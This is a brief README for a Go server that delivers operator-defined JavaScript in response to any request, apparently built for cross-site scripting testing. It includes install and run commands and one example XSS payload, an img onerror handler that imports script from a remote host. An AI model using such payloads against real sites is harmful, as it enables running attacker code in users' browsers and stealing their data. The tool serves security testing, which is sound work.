## go-xss-server

#### Overview

 Simple TLS-enabled Go server that responds to any request with the defined JavaScript payload.

#### Usage

To install either clone or use `go install github.com/redskal/go-xss-server@latest`

To run:
 - `./xss-server -key privkey.pem -crt fullchain.pem [-js script_file.js] [-s listener_addr]`

Example XSS payload:
 - `<img src=x onerror=import('//server.domain/')>`

